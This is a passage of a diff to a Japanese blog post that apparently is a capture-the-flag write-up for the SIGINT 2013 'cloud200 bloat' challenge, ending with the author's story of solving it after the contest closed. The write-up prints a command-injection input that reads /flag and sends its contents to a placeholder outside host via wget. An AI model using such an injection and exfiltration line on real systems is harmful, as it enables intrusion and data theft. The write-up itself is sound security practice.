@@ -40,7 +40,7 @@ string(4) "file"
 int(96141)
 </pre><p>ここまでくれば、あとはexec関数を実行するだけです。</p><p>しかし、関数の実行結果はレスポンスで帰ってこないため、wgetを使用して、結果を見れるようにしました。</p><p>色々したところ、/flagにflagがあることが判明したので、以下の文字列をopenIDに入力して送信し、flagを獲得しました。</p><pre>
 93802@cat /flag | awk '{print "http://xxxxx/xxx?key=" $0;}' | xargs wget
-</pre><h3>オチ</h3><p>最終的に解けたのはいいのですが、実はコンテストの開催期間を勘違いしており、問題をちゃんと解き始めた時点でコンテストが終わっていたのでした・・・</p><p>結局、ポイント的に今回はチームに貢献することができませんでしたorz</p><p>この問題のポイントを獲得したのは1チームだけだったようです。<br>参考にそのチームの方のwrite upを載せておきます。</p><p><a href=https://cesena.ing2.unibo.it/2013/07/07/sigint-2013-cloud200-bloat/>SIGINT 2013 – [cloud200] bloat</a></p><p>個人的には最後にncコマンドを使用したところは非常に参考になりました。<br>なんで思いつかなかったんだろう。。。</p></div></div><div><script src=/js/webmention.min.js async></script><div id=webmentions></div></div><div class=prev-next><div class=prev-post><p><a href=/archive/p683.html>&#8592;
+</pre><h3>オチ</h3><p>最終的に解けたのはいいのですが、実はコンテストの開催期間を勘違いしており、問題をちゃんと解き始めた時点でコンテストが終わっていたのでした・・・</p><p>結局、ポイント的に今回はチームに貢献することができませんでしたorz</p><p>この問題のポイントを獲得したのは1チームだけだったようです。<br>参考にそのチームの方のwrite upを載せておきます。</p><p><a href=https://cesena.ing2.unibo.it/2013/07/07/sigint-2013-cloud200-bloat/>SIGINT 2013 – [cloud200] bloat</a></p><p>個人的には最後にncコマンドを使用したところは非常に参考になりました。<br>なんで思いつかなかったんだろう。。。</p></div></div><div><script src=/js/webmention.min.js data-max-webmentions=60 async></script><div id=webmentions></div></div><div class=prev-next><div class=prev-post><p><a href=/archive/p683.html>&#8592;
 Previous:
 サイト移転中です</a></p><p class=prev-post-date>July 12, 2013</p></div><div class=next-post><p><a href=/archive/p697.html>Next:
 DIMVA CTF 2013 writeup
